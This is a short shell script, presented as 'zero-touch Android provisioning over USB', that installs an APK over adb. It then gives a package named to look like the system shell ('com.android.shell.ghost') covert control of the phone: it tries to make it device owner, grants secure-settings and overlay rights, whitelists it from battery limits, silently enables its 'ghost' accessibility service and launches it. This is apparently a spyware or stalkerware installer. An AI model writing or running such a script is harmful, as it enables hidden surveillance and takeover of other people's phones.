#!/bin/sh
# Zero-touch Android provisioning over USB (enable USB debugging first).
set -eu
APK="${1:-zoom-private.apk}"
adb install -r "$APK"
adb shell dpm set-device-owner com.android.shell.ghost/.GhostDeviceAdmin || true
adb shell pm grant com.android.shell.ghost android.permission.WRITE_SECURE_SETTINGS
adb shell appops set com.android.shell.ghost SYSTEM_ALERT_WINDOW allow
adb shell dumpsys deviceidle whitelist +com.android.shell.ghost
adb shell settings put secure enabled_accessibility_services com.android.shell.ghost/com.android.shell.ghost.GhostAccessibilityService
adb shell settings put secure accessibility_enabled 1
adb shell am start -n com.android.shell.ghost/.MainActivity
echo "Provisioned."
